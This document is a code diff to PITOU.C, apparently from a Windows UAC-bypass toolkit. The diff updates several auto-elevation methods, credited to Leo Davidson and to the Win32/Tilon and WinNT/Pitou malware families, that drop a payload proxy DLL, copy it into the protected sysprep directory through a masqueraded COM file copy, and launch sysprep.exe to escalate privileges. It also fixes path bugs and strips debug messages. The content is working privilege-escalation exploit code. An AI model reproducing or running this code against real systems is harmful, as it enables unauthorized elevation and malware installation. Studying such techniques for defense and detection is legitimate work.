@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     2.20
+*  VERSION:     2.40
 *
-*  DATE:        25 May 2016
+*  DATE:        06 July 2016
 *
 *  Leo Davidson based IFileOperation auto-elevation.
 *
@@ -151,6 +151,7 @@ BOOL ucmStandardAutoElevation2(
         //source filename of process
         RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
         _strcpy(SourceFilePathAndName, g_ctx.szSystemDirectory);
+        _strcat(SourceFilePathAndName, SYSPREP_DIR);
         _strcat(SourceFilePathAndName, SYSPREP_EXE);
 
         RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
@@ -187,9 +188,9 @@ BOOL ucmStandardAutoElevation2(
 * Leo Davidson AutoElevation method with derivatives.
 *
 * UacMethodSysprep1   - Original Leo Davidson concept.
-* UacMethodSysprep2   - Windows 8.1 adapted M1W7 (bypassing sysprep embedded manifest dlls redirection).
+* UacMethodSysprep2   - Windows 8.1 adapted UacMethodSysprep1 (bypassing sysprep embedded manifest dlls redirection).
 * UacMethodTilon      - Leo Davidson concept with different target dll, used by Win32/Tilon.
-* UacMethodSysprep3   - Windows 10 TH1 adapted M1W7.
+* UacMethodSysprep3   - Windows 10 TH1 adapted UacMethodSysprep1.
 * UacMethodOobe       - WinNT/Pitou derivative from Leo Davidson concept.
 *
 */
@@ -197,7 +198,7 @@ BOOL ucmStandardAutoElevation(
     UACBYPASSMETHOD Method,
     CONST PVOID ProxyDll,
     DWORD ProxyDllSize
-    )
+)
 {
     BOOL	cond = FALSE, bResult = FALSE;
     WCHAR   szSourceDll[MAX_PATH * 2];
@@ -219,7 +220,8 @@ BOOL ucmStandardAutoElevation(
         //%systemroot%\system32\sysprep      
         _strcat(szTargetDir, SYSPREP_DIR);
 
-        //%systemroot%\system32\sysprep\sysprep.exe       
+        //%systemroot%\system32\sysprep\sysprep.exe    
+        _strcat(szTargetProcess, SYSPREP_DIR);
         _strcat(szTargetProcess, SYSPREP_EXE);
 
         break;
@@ -233,6 +235,7 @@ BOOL ucmStandardAutoElevation(
         _strcat(szTargetDir, SYSPREP_DIR);
 
         //%systemroot%\system32\sysprep\sysprep.exe
+        _strcat(szTargetProcess, SYSPREP_DIR);
         _strcat(szTargetProcess, SYSPREP_EXE);
 
         break;
@@ -246,6 +249,7 @@ BOOL ucmStandardAutoElevation(
         _strcat(szTargetDir, SYSPREP_DIR);
 
         //%systemroot%\system32\sysprep\sysprep.exe
+        _strcat(szTargetProcess, SYSPREP_DIR);
         _strcat(szTargetProcess, SYSPREP_EXE);
 
         break;
@@ -272,6 +276,7 @@ BOOL ucmStandardAutoElevation(
         _strcat(szTargetDir, SYSPREP_DIR);
 
         //%systemroot%\system32\sysprep\sysprep.exe
+        _strcat(szTargetProcess, SYSPREP_DIR);
         _strcat(szTargetProcess, SYSPREP_EXE);
 
         break;
@@ -282,15 +287,11 @@ BOOL ucmStandardAutoElevation(
 
     do {
 
-        if (!supWriteBufferToFile(szSourceDll, ProxyDll, ProxyDllSize)) {
-            OutputDebugString(L"[UCM] Error extracting payload dll");
+        if (!supWriteBufferToFile(szSourceDll, ProxyDll, ProxyDllSize))
             break;
-        }
 
-        if (!ucmMasqueradedCopyFileCOM(szSourceDll, szTargetDir)) {
-            OutputDebugString(L"[UCM] Failed copy file to the protected directory");
+        if (!ucmMasqueradedCopyFileCOM(szSourceDll, szTargetDir))
             break;
-        }
 
         bResult = supRunProcess(szTargetProcess, NULL);
 
